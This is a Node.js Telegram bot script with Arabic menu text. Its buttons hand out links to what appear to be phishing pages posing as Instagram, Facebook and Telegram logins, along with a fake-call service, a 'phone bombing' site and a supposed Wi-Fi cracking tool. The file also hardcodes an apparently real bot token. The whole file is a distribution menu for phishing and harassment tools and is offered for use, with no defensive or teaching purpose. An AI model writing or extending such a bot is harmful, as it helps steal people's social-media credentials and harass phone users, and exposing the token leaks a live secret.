const TelegramBot = require("node-telegram-bot-api");

const TOKEN = "8926452536:AAGMA0SDtBfYCbAVg_4EZCwkj1sw5-p-OfQ";

const bot = new TelegramBot(TOKEN, {
  polling: true,
});

console.log("✅ Bot is running...");
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(
        msg.chat.id,
        "👋 أهلاً بك سيد عمر\n\nاختر المنصة:",
        {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "📸 Instagram", callback_data: "instagram" },
                        { text: "📘 Facebook", callback_data: "facebook" }
                    ],
                    [
                        { text: "✈️ Telegram", callback_data: "telegram" },
                        { text: "اتصال وهمي", callback_data: "twitter" }
                    ],
                    [
                        { text: "💬 تفجير هواتف", callback_data: "تفجير هواتف" },
                        { text: "تطبيق فك جميع شبكات النت", callback_data: "whatsapp" }
                    ]
                ]
            }
        }
    );
});
bot.on("callback_query", (query) => {
    const chatId = query.message.chat.id;

    switch (query.data) {

        case "instagram":
            bot.sendMessage(chatId, "📸 Instagram\nhttps://instagram-two-henna.vercel.app/");
            break;

        case "facebook":
            bot.sendMessage(chatId, "📘 Facebook\nhttps://facebook-ruby-one.vercel.app/");
            break;

        case "telegram":
            bot.sendMessage(chatId, "✈️ Telegram\nhttps://telegram-one-rho.vercel.app/");
            break;

        case "twitter":
            bot.sendMessage(chatId, "اتصال وهمي \nhttps://callmyphone.org/");
            break;

        case "whatsapp":
            bot.sendMessage(chatId, "تطبيق فك جميع شبكات Wi-fi\nhttps://wifi-free-gamma.vercel.app/");
            break;
             case "تفجير هواتف":
            bot.sendMessage(chatId, " تفجير هواتف\nhttps://kexart.com/");
            break;
    }

    bot.answerCallbackQuery(query.id);
});
